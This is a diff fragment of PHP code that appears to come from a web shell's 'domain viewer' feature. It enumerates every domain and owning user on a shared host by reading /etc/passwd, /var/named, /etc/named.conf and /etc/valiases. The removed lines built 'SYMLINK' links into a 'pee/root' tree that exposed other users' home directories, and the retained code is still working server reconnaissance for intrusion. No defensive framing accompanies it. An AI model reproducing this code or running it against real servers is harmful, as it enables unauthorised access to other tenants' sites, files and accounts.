@@ -505,7 +505,7 @@ elseif($_GET['k3'] == 'domview'){
 					echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
 					echo'<tr><td><center><b>SITE</b></center></td><td>
 					<center><b>USER</b></center></td>
-					<td></center><b>SYMLINK</b></center></td>';
+					';
 					$list = scandir("/var/named");
 					foreach($list as $domain){
 					if(strpos($domain,".db")){
@@ -515,7 +515,7 @@ elseif($_GET['k3'] == 'domview'){
 
 					echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
 					<td class='td1'><center><font color='red'>".$owner['name']."</font></center></td>
-					<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
+					";
 						}
 					}
 					echo "<center>Total Domains Found: ".$i."</center><br />";
@@ -531,7 +531,7 @@ elseif($_GET['k3'] == 'domview'){
 				if(is_readable("/etc/passwd")){
 
 				echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
-				echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';
+				echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td>';
 
 				$list = scandir("/var/named");
 
@@ -547,7 +547,7 @@ elseif($_GET['k3'] == 'domview'){
 				$i += 1;
 				echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center>
 				<td class='td1'><font color='red'>".$owner['name']."</font></center></td>
-				<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
+				";
 				}}}}
 				echo "<center>Total Domains Found: ".$i."</center><br />";}
 
@@ -555,14 +555,14 @@ elseif($_GET['k3'] == 'domview'){
 				###############################
 				if(is_readable("/etc/named.conf")){
 				echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
-				echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
+				echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td>';
 				$named = file_get_contents("/etc/named.conf");
 				preg_match_all('%zone \"(.*)\" {%',$named,$domains);
 				foreach($domains[1] as $domain){
 				$domain = trim($domain);
 				$i += 1;
 				$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
-				echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
+				echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td>";
 				}
 				echo "<center>Total Domains Found: ".$i."</center><br />";
 
@@ -581,7 +581,7 @@ elseif($_GET['k3'] == 'domview'){
 				$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
 				echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
 				<center><td class='td1'><font color='red'>".$owner['name']."</font></center></td>
-				<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
+				";
 				}
 				echo "<center>Total Domains Found: ".$i."</center><br />";
 				} else { echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>"; }
